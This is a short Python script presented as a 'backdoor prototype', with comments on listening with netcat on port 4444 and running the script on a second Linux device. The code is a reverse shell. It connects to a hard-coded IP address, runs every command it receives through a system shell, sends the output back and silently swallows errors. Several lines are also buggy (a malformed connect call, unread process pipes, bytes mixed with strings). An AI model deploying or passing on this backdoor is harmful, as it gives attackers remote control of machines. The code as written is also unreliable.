# This is a backdoor prototype that will ran by opening up a port by using nc -lvp 4444 (or any other port)
# User will then download this file on another linux device (I used raspberry pi as my hardware)
# On the other device, run python backdoorProto.py
# 


import socket
import subprocess
import os


def connect():
    # Sets up a TCP Environment 
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try:
        s.connect("192.168.64.2", 4444)
        s.send(str.encode("[!] User Detected: " + os.getcwd() + ": "))
 
        while True:
            data = s.recv(1024)
            # End connection
            if data.decode("utf-8") == "end":
                break
            
            proc = subprocess.Popen(data.decode('utf-8'), shell = True, stdout = subprocess.PIPE, stderr = subprocess.PIPE, stdin = subprocess.PIPE)
            
            output = proc.stdout + proc.stderr

            s.send(str.encode(output + os.getcwd() + ": "))

        s.close()
    except Exception as e:
        pass


if __name__ == "__main__":
    connect()